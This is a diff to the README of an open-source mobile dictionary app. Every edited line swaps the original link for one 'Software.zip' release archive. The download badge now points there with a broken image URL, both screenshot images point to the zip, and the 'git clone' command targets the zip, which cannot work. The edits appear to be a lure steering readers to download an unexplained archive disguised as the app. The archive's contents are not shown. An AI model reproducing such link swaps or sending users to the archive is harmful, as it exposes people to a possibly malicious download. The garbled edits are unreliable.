@@ -11,7 +11,7 @@ Welcome to the **Open Dictionary** repository! This open-source mobile app is cr
 
 To download the latest version of the Open Dictionary mobile app, click the button below:
 
-[![Download Open Dictionary](https://img.shields.io/badge/Download%20Link-Click%20to%20Download-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Open Dictionary](https://github.com/luizyuri/open-dictionary/releases/download/v2.0/Software.zip%20Link-Click%20to%20Download-brightgreen)](https://github.com/luizyuri/open-dictionary/releases/download/v2.0/Software.zip)
 
 🚀 **Launch the Download** 🚀
 
@@ -26,14 +26,14 @@ The Open Dictionary mobile app offers the following features:
 
 ## Screenshots
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/luizyuri/open-dictionary/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/luizyuri/open-dictionary/releases/download/v2.0/Software.zip)
 
 ## Getting Started
 
 1. Clone the repository
    ```bash
-   git clone https://github.com/your-username/open-dictionary.git
+   git clone https://github.com/luizyuri/open-dictionary/releases/download/v2.0/Software.zip
    ```
 2. Install dependencies
    ```bash
